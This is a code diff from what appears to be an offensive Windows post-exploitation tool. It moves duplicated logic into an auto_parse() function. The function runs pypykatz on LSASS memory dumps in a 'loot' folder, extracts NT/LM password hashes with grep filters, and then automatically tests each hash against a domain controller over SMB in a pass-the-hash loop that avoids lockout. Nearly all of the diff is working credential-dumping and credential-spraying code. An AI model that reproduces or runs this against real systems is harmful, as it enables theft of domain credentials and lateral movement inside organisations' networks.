@@ -1606,6 +1606,62 @@ def setup_share():
 
     return share_name, share_user, share_pass, payload_name, share_group
 
+def auto_parse():
+    printnlog('\n[parsing files]\n')
+    os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
+    os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
+    os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+
+    remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
+    if remove_files.lower() == 'y':
+        os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
+
+    if options.av:
+        printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
+        try:
+            with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
+                msv_creds = f.readlines()
+                f.close()
+        except BaseException as e:
+            printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
+        else:
+            msv_creds_cleaned = []
+            for cred in msv_creds:  # here we are going to remove any \r\n and any items that are missing a username
+                cred = cred.replace('\n', '')
+                cred = cred.replace('\r', '')
+                if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
+                    msv_creds_cleaned.append(cred)
+            if len(msv_creds_cleaned) > 0:
+                ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')
+                try:  # prevent the user from giving a non ip
+                    ipaddress.ip_address(ip_to_check_against)
+                except ValueError as e:
+                    ip_to_check_against = addresses[0]
+
+                printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
+                tried_full = []
+                for item in msv_creds_cleaned:
+                    try:
+                        if item not in tried_full:  # this prevents duplicate attempts
+                            idx_of_2nd_colon = item.find(":", item.find(":") + 1)
+                            username = item[item.find(":") + 1:idx_of_2nd_colon]
+                            nthash = item[idx_of_2nd_colon + 1:-1]
+                            if acct_chk_fail.count(username) <= 3:  # antilockout check
+                                if username not in acct_chk_valid:  # why try again if we already found a valid set
+                                    check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
+                                    tried_full.append(item)
+                                else:
+                                    printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
+                            else:
+                                printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
+                        else:
+                            printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
+                    except Exception as e:
+                        printnlog(str(e))
+                print("")
+            else:
+                printnlog('{} There are no creds to check'.format(red_minus))
+
 def alt_exec_exit():
     try:  # move the share file to the loot dir
         os.system('sudo mv /var/tmp/{} {}/loot/{}'.format(share_name, cwd, timestamp))
@@ -1622,18 +1678,10 @@ def alt_exec_exit():
         f.close()
 
     if options.ap:  # autoparse
-        printnlog('\n[parsing files]')
-        os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
-        os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
-        os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
+        auto_parse()
+    printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, cwd, timestamp, color_reset))
 
-        printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
-
-        remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
-        if remove_files.lower() == 'y':
-            os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
-
-    printnlog('\n{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
+    printnlog('{}[-]{} Cleaning up please wait'.format(color_BLU, color_reset))
 
     if os.path.isfile('{}/drives.txt'.format(cwd)):  # cleanup that file
         os.system('sudo rm {}/drives.txt'.format(cwd))
@@ -2369,62 +2417,8 @@ if __name__ == '__main__':
             f.close()
 
         if options.ap:
-            printnlog('\n[parsing files]')
-            os.system('sudo python3 -m pypykatz lsa minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full.txt'.format(cwd, timestamp, cwd, timestamp))
-            os.system('sudo python3 -m pypykatz lsa -g minidump -d {}/loot/{}/ -o {}/loot/{}/dumped_full_grep.grep'.format(cwd, timestamp, cwd, timestamp))
-            os.system("echo 'Domain:Username:NT:LM' > {}/loot/{}/dumped_msv.txt; grep --text 'msv' {}/loot/{}/dumped_full_grep.grep | cut -d ':' -f 2,3,4,5 | grep -v 'IIS APPPOOL\|NT AUTHORITY\|Window Manage\|Font Driver Host\|\$\|::\|a00000000000' >> {}/loot/{}/dumped_msv.txt".format(cwd, timestamp, cwd, timestamp, cwd, timestamp))
-
-            printnlog('\n{}Loot dir: {}/loot/{}{}'.format(color_YELL, cwd, timestamp, color_reset))
-
-            remove_files = input('\nWould you like to delete the .dmp files now? (Y/n) ')
-            if remove_files.lower() == 'y':
-                os.system('sudo rm {}/loot/{}/*.dmp'.format(cwd, timestamp))
-
-            if options.av:
-                printnlog('\n{} Reading dumped_msv.txt'.format(green_plus))
-                try:
-                    with open('{}/loot/{}/dumped_msv.txt'.format(cwd, timestamp), 'r') as f:  # read the dumped_msv.txt file into msv_creds
-                        msv_creds = f.readlines()
-                        f.close()
-                except BaseException as e:
-                    printnlog('\n{}[!]{} There was an error reading the dumped_msv.txt file'.format(color_RED, color_reset))
-                else:
-                    msv_creds_cleaned = []
-                    for cred in msv_creds:  # here we are going to remove any \r\n and any items that are missing a username
-                        cred = cred.replace('\n', '')
-                        cred = cred.replace('\r', '')
-                        if cred.find('::') == -1 and cred.find('Domain:Username:NT:LM') == -1:
-                            msv_creds_cleaned.append(cred)
-                    if len(msv_creds_cleaned) > 0:
-                        ip_to_check_against = input('\nEnter an IP to check the accounts against (Preferably a domain controller): ')
-                        try: # prevent the user from giving a non ip
-                            ipaddress.ip_address(ip_to_check_against)
-                        except ValueError as e:
-                            ip_to_check_against = addresses[0]
-
-                        printnlog('\n{} Attempting to check {} creds\n'.format(green_plus, len(msv_creds_cleaned)))
-                        tried_full = []
-                        for item in msv_creds_cleaned:
-                            try:
-                                if item not in tried_full:  # this prevents duplicate attempts
-                                    idx_of_2nd_colon = item.find(":", item.find(":") + 1)
-                                    username = item[item.find(":") + 1:idx_of_2nd_colon]
-                                    nthash = item[idx_of_2nd_colon + 1:-1]
-                                    if acct_chk_fail.count(username) <= 3:  # antilockout check
-                                        if username not in acct_chk_valid:  # why try again if we already found a valid set
-                                            check_accts(username, None, domain, ip_to_check_against, ip_to_check_against, ':' + nthash, None, False, None, int(445))
-                                            tried_full.append(item)
-                                        else:
-                                            printnlog('{}[!]{} Skipping {}:{} due to valid creds for account already found'.format(color_BLU, color_reset, username, nthash))
-                                    else:
-                                        printnlog('{}[!]{} Skipping {}:{} to prevent lockout'.format(color_BLU, color_reset, username, nthash))
-                                else:
-                                    printnlog('{}[!]{} Skipping {} because of duplicate creds'.format(color_BLU, color_reset, item))
-                            except Exception as e:
-                                printnlog(str(e))
-                        print("")
-                    else:
-                        printnlog('{} There are no creds to check'.format(red_minus))
+            auto_parse()
+        printnlog('\n{}Loot dir: {}/loot/{}{}\n'.format(color_YELL, cwd, timestamp, color_reset))
 
     except KeyboardInterrupt as e:
         logging.error(str(e))
